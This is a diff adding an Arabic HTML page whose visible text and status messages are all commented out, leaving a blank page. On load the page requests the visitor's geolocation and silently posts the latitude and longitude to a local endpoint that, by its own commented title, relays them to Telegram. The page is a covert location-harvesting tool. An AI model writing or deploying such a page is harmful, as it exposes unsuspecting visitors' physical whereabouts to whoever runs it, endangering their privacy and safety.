@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <!-- <title>إرسال الموقع إلى تلغرام</title> -->
+    <style>
+        body { direction: rtl; text-align: center; font-family: Arial; padding: 20px; }
+        #location { font-size: 20px; margin: 20px; padding: 15px; background: #f0f0f0; }
+    </style>
+</head>
+<body>
+    <!-- <h1>🌍 الموقع الجغرافي</h1> -->
+    <!-- <div id="location">جاري تحديد الموقع...</div>
+    <div id="result"></div> -->
+
+    <script>
+        let coords = {};
+        
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        coords = position.coords;
+                        // document.getElementById('location').innerHTML = `
+                        //     خط العرض: ${coords.latitude}<br>
+                        //     خط الطول: ${coords.longitude}
+                        // `;
+                        sendToTelegram()
+                    },
+                    // error => {
+                    //     document.getElementById('location').textContent = 
+                    //         'خطأ في الحصول على الموقع: ' + error.message;
+                    // }
+                );
+            } else {
+                document.getElementById('location').textContent = 
+                    'المتصفح لا يدعم خدمة الموقع الجغرافي';
+            }
+            
+        };
+
+        async function sendToTelegram() {
+            // const btn = document.getElementById('sendBtn');
+            // btn.disabled = true;
+            // btn.textContent = 'جاري الإرسال...';
+            
+            try {
+                const response = await fetch('http://127.0.0.1:3000/send-location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        lat: coords.latitude,
+                        lng: coords.longitude
+                    })
+                });
+
+                const result = await response.json();
+                if (result.ok) {
+                    // document.getElementById('result').innerHTML = 
+                    //     '✅ تم الإرسال بنجاح إلى تلغرام';
+                } else {
+                    throw new Error(result.error);
+                }
+            } catch (error) {
+                // document.getElementById('result').innerHTML = 
+                //     '❌ خطأ في الإرسال: ' + error.message;
+            } finally {
+                // btn.disabled = false;
+                // btn.textContent = 'إرسال إلى تلغرام';
+            }
+        }
+    </script>
+</body>
+</html>
